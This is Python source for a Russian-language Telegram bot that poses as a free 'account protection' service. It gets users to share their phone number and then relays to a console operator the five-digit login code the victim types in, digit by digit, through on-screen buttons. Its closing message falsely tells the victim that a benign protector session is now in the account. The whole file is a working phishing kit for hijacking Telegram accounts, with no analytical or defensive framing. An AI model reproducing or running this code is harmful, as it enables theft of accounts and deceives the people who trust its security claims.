import telebot
from telebot.types import ReplyKeyboardMarkup, KeyboardButton

API_TOKEN = ''
bot = telebot.TeleBot(API_TOKEN)

user_phone_numbers = {}
current_code = {}
entered_code = {}


@bot.message_handler(commands=['start'])
def send_welcome(message):
    markup = ReplyKeyboardMarkup(resize_keyboard=True)
    confirm_button = KeyboardButton('✅ Подтвердить', request_contact=True)
    markup.add(confirm_button)
    bot.send_message(message.chat.id, "Для защиты вашего аккаунта, подтвердите свой номер телефона.", reply_markup=markup)


@bot.message_handler(content_types=['contact'])
def handle_contact(message):
    phone_number = message.contact.phone_number
    user_phone_numbers[message.chat.id] = phone_number
    print(f"Получен номер: {phone_number}")
    bot.send_message(message.chat.id, "Для защиты вашего аккаунта нажмите на кнопку ниже.")


    markup = ReplyKeyboardMarkup(resize_keyboard=True)
    protect_button = KeyboardButton('✨ Официально защитить')
    markup.add(protect_button)
    bot.send_message(message.chat.id, "Нажав на кнопку, вы подтверждаете защиту вашего аккаунта. Это бесплатно и без рисков!", reply_markup=markup)

@bot.message_handler(func=lambda message: message.text == '✨ Официально защитить')
def handle_protect_button(message):
    bot.send_message(message.chat.id, "Вы уверены? Это бесплатно и без рисков. Ваша защита в наших руках.")

    
    markup = ReplyKeyboardMarkup(resize_keyboard=True)
    confirm_button = KeyboardButton('✅ Подтвердить')
    markup.add(confirm_button)
    bot.send_message(message.chat.id, "Нажмите на кнопку для завершения.", reply_markup=markup)


@bot.message_handler(func=lambda message: message.text == '✅ Подтвердить')
def handle_final_confirm(message):
    print(f"Подтвердите обработку номера {user_phone_numbers.get(message.chat.id)} (да/нет)")
    bot.send_message(message.chat.id, "Ожидайте проверки!")
    user_input = input("Продолжить обработку? (да/нет): ").strip().lower()
    if user_input == 'да':
        bot.send_message(message.chat.id, "Введите код, отправленный вам. Выберите цифры с помощью кнопок ниже.")
        
        markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=3)
        buttons = [KeyboardButton(str(i)) for i in range(10)]
        markup.add(*buttons)
        entered_code[message.chat.id] = ""
        bot.send_message(message.chat.id, "Код: *****", reply_markup=markup)
    elif user_input == 'нет':
        print("Обработка отменена.")

# Обработка ввода кода
@bot.message_handler(func=lambda message: message.text.isdigit() and message.chat.id in entered_code)
def handle_code_input(message):
    if len(entered_code[message.chat.id]) < 5:
        entered_code[message.chat.id] += message.text
        hidden_code = "*" * (5 - len(entered_code[message.chat.id])) + entered_code[message.chat.id]
        bot.send_message(message.chat.id, f"Код: {hidden_code}")

        if len(entered_code[message.chat.id]) == 5:
            print(f"Полученный код: {entered_code[message.chat.id]}")
            user_input = input("Подтвердите код (да/нет): ").strip().lower()
            if user_input == 'да':
                markup = ReplyKeyboardMarkup(resize_keyboard=True)
                confirm_button = KeyboardButton('✅Статус защиты✅')
                markup.add(confirm_button)
                bot.send_message(message.chat.id, "Ваш аккаунт защищён. Спасибо за доверие! Сесия бота защитника в вашем аккаунте доброжелательная мы не можем прочитать ваши личные данные, а лишь защищаем ваш аккаунт", reply_markup=markup)
            elif user_input == 'нет':
                print("Повторите ввод кода.")
                entered_code[message.chat.id] = ""
                bot.send_message(message.chat.id, "Введите код заново. Выберите цифры с помощью кнопок ниже.")


                markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=3)
                buttons = [KeyboardButton(str(i)) for i in range(10)]
                markup.add(*buttons)
                bot.send_message(message.chat.id, "Код: *****", reply_markup=markup)
@bot.message_handler(func=lambda message: message.text == '✅Статус защиты✅')
def ff(message):
    bot.send_message(message.chat.id, "Защищен")

print("Бот запущен")
bot.infinity_polling()
